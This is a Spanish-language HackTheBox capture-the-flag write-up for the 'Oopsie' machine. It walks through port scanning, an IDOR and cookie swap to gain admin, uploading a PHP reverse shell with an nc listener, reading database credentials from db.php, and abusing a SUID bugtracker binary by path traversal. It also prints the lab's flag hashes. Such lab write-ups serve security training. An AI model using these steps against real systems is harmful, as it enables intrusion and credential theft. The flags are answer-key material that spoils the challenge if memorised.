---
titulo: "Oopsie"
descripcion: "IDOR en panel de tickets permite escalar a admin y acceder a /uploads/. Webshell PHP como www-data. Credenciales en db.php revelan usuario robert. Bugtracker SUID con path traversal expone flag root."
fecha: 2026-06-08
dificultad: easy
herramientas: ["nmap", "gobuster", "curl", "nc"]
categoria: htb
plataforma: HackTheBox
completado: true
fases: ["Reconocimiento", "Foothold", "Escalada de Privilegios"]
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.66.44
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p22,80 -sCV 10.129.66.44
```

Puertos abiertos:
- **22/tcp (SSH)**
- **80/tcp (HTTP)** — aplicación web con login

### Enumeración de directorios

```bash
gobuster dir -u http://10.129.66.44 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```

Directorios encontrados: `/css/`, `/js/`, `/images/`, `/fonts/`, `/themes/`, `/uploads/` (acceso restringido), `/cdn-cgi/login/` — página de login.

## Foothold

### IDOR en panel de clientes

El login permite acceso como `guest`. Dentro del panel, la sección `Accounts` lista clientes por ID en la URL:

```
http://10.129.66.44/cdn-cgi/login/index.php?page=clients&id=1
```

Cambiando el parámetro `id` se accede a información de otros usuarios. El ID del administrador es `34322`. Accediendo a `id=34322` se revelan sus privilegios; al cambiar la cookie de sesión con ese valor se obtiene acceso como admin. IDOR (Insecure Direct Object Reference).

### RCE vía webshell

Como admin, se obtiene acceso al directorio `/uploads/`. La aplicación permite subir archivos PHP sin restricción. Se utiliza `php-reverse-shell.php` modificando `$ip` y `$port`:

```bash
# En máquina atacante
nc -lvnp 4444
```

Se ejecuta el webshell accediendo a:

```
http://10.129.66.44/uploads/php-reverse-shell.php
```

Shell obtenida como `www-data`.

```bash
cat /home/robert/user.txt
```

## Escalada de Privilegios

### Credenciales en código fuente

En el webroot, el archivo `db.php` expone credenciales de base de datos:

```bash
cat /var/www/html/cdn-cgi/login/db.php
```

Output:

```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

**Credenciales:** `robert:M3g4C0rpUs3r!`

### Cambio de usuario

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su robert
# Password: M3g4C0rpUs3r!
```

### Bugtracker SUID — Path Traversal

Robert pertenece al grupo `bugtracker`. El binario `/usr/bin/bugtracker` tiene SUID root:

```bash
ls -la /usr/bin/bugtracker
# -rwsr-xr-x root bugtracker
```

Análisis con `strings`:

```bash
strings /usr/bin/bugtracker
```

Se observa la llamada vulnerable:

```
cat /root/reports/
```

El binario concatena el input del usuario a un comando `system()` sin sanitizar. Path traversal directo:

```bash
bugtracker
# Provide Bug ID: ../root.txt
```

Root flag expuesta.

## Flags

| Flag | Hash |
|------|------|
| User | `f2c74ee8db7983851ab2a96a44eb7981` |
| Root | `af13b0bee69f8a877c3faf667f7beacf` |
